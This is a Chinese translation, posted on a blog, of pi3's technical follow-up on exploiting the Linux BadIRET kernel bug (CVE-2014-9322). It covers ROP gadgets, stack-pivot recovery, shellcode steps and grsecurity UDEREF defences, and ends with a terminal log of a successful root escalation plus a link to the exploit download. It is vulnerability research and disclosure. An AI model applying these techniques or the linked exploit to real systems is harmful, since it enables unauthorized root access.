---
layout: post
title:  "后续故事：数字军火级别的\"BadIRET\"漏洞利用(CVE-2014-9322)"
date:   2015-07-05 15:46:39
categories: jekyll update
---


作者：pi3, July 4 2015

原文：[Follow-up on Exploiting “BadIRET” vulnerability (CVE-2014-9322)](http://blog.pi3.com.pl/?p=509)

译者：Shawn the R0ck, July 5 2015


Shawn：nergal在2015年2月公开的针对[BadIRET漏洞的分析文章](http://hardenedlinux.org/jekyll/update/2015/07/05/badiret-analysis.html)仿佛就在昨天，但Linux内核社区对安全的态度的确比10年还糟糕，Linux内核社区一如既往坚持"Security through obscurity"这种简单到根本不用考虑斯拉夫兵工厂的威胁建模，不辛的是，BadIRET又是一例Linux内核社区认为几乎不可利用但实际是可利用的漏洞，更糟糕的是一些商业GNU/Linux厂商因为各种原因（在后棱镜时代，不得不考虑非商业因素的可能）基本按照[是否有公开的漏洞利用会成为他们对于风险评估的重要指标](https://securityblog.redhat.com/2015/04/08/dont-judge-the-risk-by-the-logo/)，这种说法好像是当0-day exploit从来都不存在一样，这的确是一个黑暗的时代，就算没有Mr.Snowden，这的确也称的上是一个黑暗的信息时代，anyway，这次pi3公开了BadIRET的漏洞利用代码，这对于安全研究人员来说是一个好事，也希望整个事件能帮助个人以及企业GNU/Linux用户对于安全有正确的认识。

一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug --> exploitable bug(vulnerability) --> poc --> exploit --> reliable/weaponized exploit。虽然skiddie都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但让数字军火商或者斯拉夫兵工厂关心的漏洞属于能到最后两个阶段的vulnerability。

---------------------------------------------------
by pi3

Hi,

分析[CVE-2014-9322](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322)的旅程并非一帆风顺，但它值得我们花一些时间去分析所有的信息。我会尽力...

## 1) Introduction – non-technical (almost)

一切都开始于[CVE-2014-9090](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9090)。这个漏洞是由Andy Lutomirski发现的，引用MITRE的描述：
<pre>
Linux内核3.17.4在arch/x86/kernel/traps.c里的do_double_fault函数没有正确
的处理SS(Stack Segment)寄存器相关的错误处理，导致本地用户可以发启DoS攻
击让内核panic(...)
</pre>

这个顶多导致本地DoS攻击的洞对于防御者而言听起来并不是那么重要（但也引起了一定的注意，因为毕竟是一个漏洞），对于攻击者的角度也是一样，因为即使利用成功也无法获得巨大利益( Shawn:相对于获得root而言)。

"有趣"的是在Borislav Petkov问了一些问题后，Andy Lutomirski在相同的功能里发现了另一个被第一个漏洞掩盖的漏洞。不幸(幸运)的是，这是一个很严重的漏洞。Linux内核在x86架构下没有恰当的处理于SS寄存器有关的错误处理。引用自MITRE：
<pre>
"(...)通过触发一个IRET指令从一个错误的空间去去访问一个GS基地址从而让本地用户获取最高权限"
</pre>

这个漏洞的特性听起来很熟悉吗？

那Rafal ‘n3rgal’ Wojtczuk的研究最终停止于[CVE-2012-0217](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0217)呢？(这个直接指向了[CVE-2006-0744](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0744))

是的...原则上两个漏洞都给我们了相同的东西 --- 我们能强制内核去执行在用户空间控制的GS基地址（通过%gs寄存器）。

因为一些原因CVE-2014-9322并没有引起太多注意（跟CVE-2006-0744类似），直到Rafal ‘n3rgal’ Wojtczuk在2015年2月5日在Bromium Labs的blog上[公布了另外震撼的研究](http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/)。

这篇分析谈到了关于这个漏洞的本质，即可以被利用为代码执行（这可不是简单的事情，点赞n3rgal的研究）和使用单个字节为NULL的写操作让整个漏洞利用成为军火级别的稳定利用，能绕过SMEP（不是SMAP）。非常推荐读读这篇分析。

在这篇漏洞分析公开后引起了更多的关注（特别是grsecurity的twitter帐号:-)）。知道现在（差不多半年了）也没有公开的真正的漏洞利用去实现Rafal关于代码执行的想法。只有一个演示DoS攻击的PoC（结果和CVE-2014-9090相同 --- 没多大用处）：

https://rdot.org/forum/showthread.php?t=3341

另外一个实现：

https://www.exploit-db.com/exploits/36266/


## 2) More technical part (based on Fedora 20 -> kernel: 3.11.10-301.fc20.x86_64)

我决定接受这个挑战去完整的实现Rafal的想法并且在成功的过程中解决了很多有趣的问题。我将以Rafal的分析文章结束作为开始，最终成功的实现stack pivoting和执行ROP gadgets（在他的描述里是去关掉CR4寄存器中关掉SMEP和在用户空间的页去执行'真'的shellcode/kernelcode）。

*) Stack pivoting和ROP执行于follow_link()函数的上下文，这个函数是inline所以整个实现都在path_openat()的代码段里。这里是概述的上下文流程：
<pre>
SyS_open -> SYSC_open -> do_sys_open -> do_filp_open -> path_openat -> follow_link()
</pre>

Inline函数调用相对地址，这可以最终重定向到我们的代码：
<pre>
...
   0xffffffff811b84ab <+955>:   jmpq   0xffffffff811b81b3 
   0xffffffff811b84b0 <+960>:   movl   $0x4,0x40(%r12)
   0xffffffff811b84b9 <+969>:   mov    0x30(%r15),%rax
   0xffffffff811b84bd <+973>:   mov    %r15,%rdi
   0xffffffff811b84c0 <+976>:   mov    %r12,%rsi
   0xffffffff811b84c3 <+979>:   mov    0x20(%rax),%rax
   0xffffffff811b84c7 <+983>:   callq  *0x8(%rax)
                                ^^^^^^^^^^^^^^^^^
   0xffffffff811b84ca <+986>:   cmp    $0xfffffffffffff000,%rax
   0xffffffff811b84d0 <+992>:   mov    %rax,%r15
   0xffffffff811b84d3 <+995>:   jbe    0xffffffff811b8532 
   0xffffffff811b84d5 <+997>:   mov    %r12,%rdi
   0xffffffff811b84d8 <+1000>:  mov    %eax,%ebx
   0xffffffff811b84da <+1002>:  callq  0xffffffff811b2930 
...
</pre>

在我们的代码执行后第一个问题来了，所有调用函数path_put(), do_last(), dput(), mntput()或者put_link()可能都会遇到内核锁。因为栈已经被pivoted可不会带来一个好的结局。另外，path_openat()里有很多inline函数，一些寄存器有特殊意义（指针指向特定的结构或者对象），所以内核去访问某个点可能会直接造成内核崩溃。

一开始我尝试跟踪了所有有问题的执行过程和手工修复了一些，但这条路径下的寄存器/对象/spinlocks之间有太多的关联...（btw，不幸（幸运）的是，跟之前的版本相比，Linux内核3.xx改变了raw_spin_lock的内部描述，当你打算手工同步时这会成为一个问题）。

这里需要一个更好的解决方案，如果你思考下关于pivoting自己你可能会找到一个方案。如果你打算手工修复所有在这个过程中遇到的问题你也能成功。如果你找到一条路径去把原始的栈帧”恢复“到stack pivoting之前的状态，这会帮你搞定所有的锁问题，正确的对栈进行unwind以及系统会稳定的运行。这是能实现的，让我们称她为reverse stack pivoting;-)。在stack pivot后，在临时寄存器里你应该会拥有一个你想知道的栈的合法地址。在我们的场景里稍微有些复杂，因为我们失去了地址的32位的最高有效位。ROP gadgets像：
<pre>
   0xffffffff8119f1ed <__mem_cgroup_try_charge+1949>:   xchg   %eax,%esp
   0xffffffff8119f1ee <__mem_cgroup_try_charge+1950>:   retq
</pre>

为什么这些gadget会产生而32 bits会丢失呢？请阅读Rafal的文章。

所以，如果我们在直接pivoting后找到了一些能保存原始栈上32位最低有效位ROP gadget，我们可以尝试在把控制权交给内核前恢复和重构原始地址。我选择了如下ROP-gadget：
<pre>
   0xffffffff8152d8fe :       push   %rax
   0xffffffff8152d8ff :       pop    %rax
   0xffffffff8152d900 :       pop    %rbp
   0xffffffff8152d901 :       retq
</pre>

去执行push %rax（这个值事实上高位被清零了）和保存值后移动栈指针。在这个点上我们可以精确的计算它会存在哪里。

问题解决了（reverse-stack pivot胜利 :P）

*) 如果你的shellcode执行时间过长，有很大的概率进程调度器会让更紧急的任务先执行， -- 取决于当前的执行和什么样的任务会抢占。你可能经常收到APIC时间中断去更新进程时间，在有些情况下可能会带给你的漏洞利用一些麻烦，你必须考虑这些事情！

btw.如果你运气不好，在做stack pivoting时刚好被抢占;p（Shawn:这种概率都遇上了你也就认了吧，可能真是上帝让你别去日你的当前目标；-））

*) 我们的代码执行时但proc_root结构被损坏...;-) 这不是我们愿意看到的。如果有其他进程对/proc文件系统有任何操作，它会戏剧性的增加内核崩溃的概率。proc_root.subdir值必须尽快被恢复以避免系统被随机的crash掉。有几种可能的方法：

a) instead of overwriting 6 bytes of subdir do only 5 of them which will leave 3 bytes untouched. This means we can easily reconstruct original value by adding 0xffff8800 value at the most significant bits (for that kernel) and trying to find only 1 byte which is 256 possibilities. Chance of crash is very low (touching not mapped page). Additionally this requires allocation in user space around 16 MB to have guarantee that after referencing overwritten proc_root.subdir always ends up in our controlled memory.

b) we can brute force full address by ‘preventing’ from Page Fault (#PF). For the short period of time we can overwrite #PF handler with simple code:

    – Get the exception from the stack
    – Change the address which caused crash to smth which we know is mapped
    – Restart faulting instruction

original brute force loop will continue running

c) Ignore all of the problems and just reconstruct address as much as it can be and do brute force rest of the bytes. Apparently it’s quite reliable and effective. We know that high significant bytes are 0xffff8800 and we have 2 least significant bytes. We need to find 2 bytes which are unknown for us. On Linux (as opposed to Windows) kernel memory are not being paged out (swapped out). Chance of hitting unmapped page is quite low when we brute force just 2 bytes in the middle of reconstructed address – believe me or not, it works well :)

Problem is also how we judge if the address is correct or not. It’s quite simple, struct proc_dir_etry has ‘parent’ field. We must find address which will have on the specific offset, address of proc_root (which is known). In the end we check 65536 addresses and chance of FP is low as well. I’ve never hit that situation.

Summarizing our shellcode must:

    – save original stack pointer value
    – disable interrupts (to prevent from being preempted) and start to reconstruct corrupted proc_root.subdir value
    – do REAL (s)hellcode
    – restore original stack pointer
    – restore frame pointer
    – restore registers pointing to the internal objects
    – enable interrupts and return to the normal kernel execution 

 

## 3) Grsecurity => UDEREF

之前我提到过Rafal的研究曾经被spender给“看到”过：

http://twitter.com/grsecurity/status/562363332079144960
http://twitter.com/grsecurity/status/562363788125831172

另外，一些人建议UDEREF和SMAP一样能高效的防御这个漏洞：

http://seclists.org/oss-sec/2014/q4/1052

<pre>
"这可能是一个容易的提权的漏洞利用，但除了针对带有SMAP和UDEREF的系统。在
SMAP/UDEREF上，假定mitigation都是奏效的，这个bug的影响可能会局限于大规
模的memory corruption和crash或者重启。"
</pre>

这并不是完全正确。UDEREF可能跟（事实上，甚至远超）SMAP一样高效，或者仅像SMEP（在AMD64上）一样有效的防御漏洞利用。但问题出在哪里呢？目前针对AMD64平台，UDEREF有3种不同的实现：

- 慢/弱的遗留实现
- 针对Sandy Bridge(Shawn：2011年）和后续CPU的强实现
- 针对Sandy Bridge和后续CPU的快/弱实现

第一个针对AMD64平台的UDEREF实现是“弱”实现，相关信息PaX team也有描述：

http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html

<pre>
"(...)所以amd64的UDEREF做了些什么呢？在用户空间->内核空间的转换中基本上
unmaps了原始用户地址范围和重新映射到了不同的地址上并且标记为不可执行
/supervisor权限（所以至少直接的代码执行作为漏洞利用是无法奏效的）
</pre>

然后接着：

<pre>
"(..) UDEREF/amd64不保证（合法）用户空间访问函数当用户空间被允许（一些
像特定系统作为用户空间临时访问内核内存，这在UDEREF/i386上被强制一致，而
在AMD64上则没有）不可以直接访问内核内存。所以如果有BUG能骗内核进入用户
空间访问的指针又恰好指向内核空间的话就能利用成功，这一点不像i386的实现。

另外一件糟糕的事情是用户空间的阴影区域，这造成了2个后果：1，用户空间地
址大小小于UDEREF（42 vs 47 bits，这种减小最终影响ASLR）， 2，这个阴影区
域总是映射着，所以内核代码异常访问这个区间并不会造成oops而且也是可被利
用的（如果一个漏洞利用能让内核deref这一区域里的任意地址）(...)"
</pre>

== weak UDEREF ==
这意味着实际上UDEREF类似SMEP。所以如何能成功的漏洞利用有这个版本的UDEREF的系统呢？你只需要修改ROP。不像在CR4寄存器中关掉SMEP位，而是从用户空间实现完整的ROP的shellcode。这是可能的，“弱”UDEREF实现无法防御这种利用。


== "new" UDEREF ==

为什么“强”UDEREF实现是不同的而为什么她需要Sandy Bridge架构的支持？

对，这是有趣的部分。我从没见关于"新“版UDEREF来自于官方的任何信息。我都没注意到这些实现有些变动是在我玩漏洞利用时产生的;-)

强UDEREF实现使用的Sandy Bridge++特性被称为PCID，PCID在TLB中打"tags"（Shawn:有些人会翻译为标签）。UDEREF可以完全的分离用户空间和内核空间（通过创建新的PGD表）：
<pre>
static inline void enter_lazy_tlb(struct mm_struct *mm, struct task_struct *tsk)
{
++#if defined(CONFIG_X86_64) && defined(CONFIG_PAX_MEMORY_UDEREF)
+     if (!(static_cpu_has(X86_FEATURE_PCID))) {
+             unsigned int i;+                pgd_t *pgd;
++            pax_open_kernel();
+             pgd = get_cpu_pgd(smp_processor_id(), kernel);
+             for (i = USER_PGD_PTRS; i < 2 * USER_PGD_PTRS; ++i)
+                     set_pgd_batched(pgd+i, native_make_pgd(0));
+             pax_close_kernel();
+     }
+#endif

+#if defined(CONFIG_X86_64) && defined(CONFIG_PAX_MEMORY_UDEREF)
+             if (static_cpu_has(X86_FEATURE_PCID)) {
+                     if (static_cpu_has(X86_FEATURE_INVPCID)) {
+                             u64 descriptor[2];
+                             descriptor[0] = PCID_USER;
+                             asm volatile(__ASM_INVPCID : : "d"(&descriptor), "a"(INVPCID_SINGLE_CONTEXT) :
"memory");
+                             if (!static_cpu_has(X86_FEATURE_STRONGUDEREF)) {
+                                     descriptor[0] = PCID_KERNEL;
+                                     asm volatile(__ASM_INVPCID : : "d"(&descriptor),
"a"(INVPCID_SINGLE_CONTEXT) : "memory");
+                             }
+                     } else {
+                             write_cr3(__pa(get_cpu_pgd(cpu, user)) | PCID_USER);
+                             if (static_cpu_has(X86_FEATURE_STRONGUDEREF))
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL | PCID_NOFLUSH);
+                             else
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL);
+}
+             } else
+#endif
</pre>

最终，运行于内核模式的上下文将看不到任何用户空间的页。这个实现我个人相信比SMAP要强的多。为什么呢？

1. 你不能只关闭CR4寄存器里的一个bit而关掉整个mitigation

2. 在SMAP的情况下，你可以看到用户空间的页（有存在的页表翻译用户空间地址，'P'位已经设置）但你仅仅是不能触碰到。在"新"UDEREF的情况下，你根本看不到用户空间（内核上下文的PGD是完全不同的，没有页表描述用户空间地址。'P'没有被设置）。

这个UDEREF版本最早是在grsecurity 3.0于2014年2月引入的。干得漂亮！如果PaX/Grsecurity能公布一些他们的研究细节就更棒了;-)

Btw. 这2个case都是接触到用户空间地址是一样的 - #PF会被生成;-)

Btw2. 同样的“强”UDEREF可以不需要硬件PCID特性也能实现。但最大的区别就是性能。如果没有硬件PCID支持的情况下从性能的角度看，这个特性会很糟糕。

## == Summarizing ==

这个漏洞可以在UDEREF下被利用，但不能在使用了Sandy Bridge++特性的“新”UDEREF下被利用。

事实上，你仍然可以用这个漏洞针对“新”UDEREF用作DoS攻击？如何实现呢？这个很有趣，你可以强制#PF的无限循环;-) 当内核进入do_general_protection()函数后会尝试通过以下指令让GS基读取GDT：

<pre>
    0xffffffff8172910e :       mov    %gs:0xa880,%rbx
</pre>

这个情况下GS基是指向用户空间的内存。因为这里没有PTE条目（内核看不到用户空间的页），#PF将会被产生。page_fault()函数会被执行：

<pre>
page_fault -> do_page_fault -> __do_page_fault -> restore_args
</pre>

这会导致再次读GDT然后下一个#PF产生，就这样一直循环下去;-) 是的，你可以让内核崩溃掉但没办法做进一步的漏洞利用。漏洞利用在这里被阻止了。

## 4) Funny facts;-)

a) 当你调用pthread_create()函数时，一些版本的libthread需要创建RWX权限的内存。这在PaX/Grsec的mmap()加固是不被允许的，当pthread_create()调用mmap()时进程会被杀掉;-) 我在Ubuntu LTS上运行grsecurity加固内核时遇到过这个情况。

b) 在内核3.11.10-301.fc20.x86_64的__switch_to()函数实现中使用了OSXSAVE扩展（CR4寄存器的bit 18），但内核并不检查这个CPU是否有这个扩展：
<pre>
     0xffffffff81011714 <__switch_to+644>    xsaveopt64 (%rdi)
</pre>

__switch_to()是在禁用中断时运行，如果OSXSAVE扩展没有打开的话，CPU会生成一个#UD造成死锁。在进入__switch_to()指令之前，不管是否关闭中断都会锁住runqueue运行队列，在#UD的情况下不会被解锁。

我好奇如果有人真的遇到过这个问题;-)

c) Fedora 20作为测试环境，这个漏洞利用非常稳定（[源代码在我的网站上已经公布](http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz)）：
<pre>
[pi3@localhost clean_9322]$ cat z_shell.c
#include 

int main(void) {

   char *p_arg[] = { "/bin/sh", NULL };

   setuid(0);
   seteuid(0);
   setgid(0);
   setegid(0);
   execv("/bin/sh",p_arg,NULL);

}
[pi3@localhost clean_9322]$ gcc z_shell.c -o z_shell
[pi3@localhost clean_9322]$ cp z_shell /tmp/pi3
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwxrwxr-x 1 pi3 pi3 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
sh-4.2$ exit
exit
[pi3@localhost clean_9322]$ gcc -o procrop procrop.c setss.S
[pi3@localhost clean_9322]$ gcc -o p_write8 swapgs.c setss.S -lpthread
swapgs.c: In function ‘main’:
swapgs.c:175:29: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
               : "r"(4), "r"((int)p_to_d), "r"(1)
                             ^
[pi3@localhost clean_9322]$ ./procrop

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           && Adam 'pi3' Zabrocki

                Usage: ./procrop 

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$ ./procrop 1 &
[1] 5827
[pi3@localhost clean_9322]$
        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           && Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ps aux |grep procr
pi3       5827 83.0  0.0   4304   320 pts/1    RL   23:12   0:05 ./procrop 1
pi3       5829  0.0  0.1 112660   916 pts/1    S+   23:12   0:00 grep --color=auto procr
[pi3@localhost clean_9322]$ ./p_write8

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           && Adam 'pi3' Zabrocki

                Usage: ./p_write8 

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ./p_write8 1

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           && Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64
        [+] mmap() memory in first 2GB of address space... DONE!
        [+] Preparing kernel structures... DONE! (ovbuf at 0x602140)
        [+] Creating LDT for this process... DONE!
        [+] Press enter to start fun-game...
[exploit] pthread runningAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[1]+  Done                    ./procrop 1
Segmentation fault (core dumped)
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwsrwsrwx 1 root root 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root),1000(pi3)
sh-4.2# exit
exit
[pi3@localhost clean_9322]$
</pre>

References:

1) http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/

2) https://rdot.org/forum/showthread.php?t=3341

3) https://www.exploit-db.com/exploits/36266/

4) http://blog.pi3.com.pl/?p=509

5) http://twitter.com/grsecurity/status/562363332079144960

6) http://twitter.com/grsecurity/status/562363788125831172

7) http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

8) http://seclists.org/oss-sec/2014/q4/1052

9) http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html
